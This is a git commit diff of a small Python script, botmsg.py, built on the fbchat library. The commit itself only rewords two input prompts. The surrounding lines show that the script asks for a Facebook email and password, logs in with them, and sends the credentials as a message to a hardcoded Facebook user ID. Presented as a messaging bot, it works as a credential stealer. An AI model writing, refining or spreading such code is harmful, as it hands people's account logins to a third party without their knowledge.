4d22daf5ec19d86650aa7d76c3229a7bb7de9b7d
Fyuhftyjii <62509664+Fyuhftyjii@users.noreply.github.com>
2020-03-28 12:16:37 +0630

    Update botmsg.py

--- botmsg.py
+++ botmsg.py
@@ -1,8 +1,8 @@
 import fbchat
 from fbchat import Client
 from getpass import getpass
-username = str(input("mail"))
-getpass = str(input("pass"))
+username = str(input("Enter Your Mail::"))
+getpass = str(input("Enter Your Pass::"))
 message = username+":"+getpass
 client = fbchat.Client(username, getpass)
 sent = client.send(fbchat.models.Message(message),100025248024301)
